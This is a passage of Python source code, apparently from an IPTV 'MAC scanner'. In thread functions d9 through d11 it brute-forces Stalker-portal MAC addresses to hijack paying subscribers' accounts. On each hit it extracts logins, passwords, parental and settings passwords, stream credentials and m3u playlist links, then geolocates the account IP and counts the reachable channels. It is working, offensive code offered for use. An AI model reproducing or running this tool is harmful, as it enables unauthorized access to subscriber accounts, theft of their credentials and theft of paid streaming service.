                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d9():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(9, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_09"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d10():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(10, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_10"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d11():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(11, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_11"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
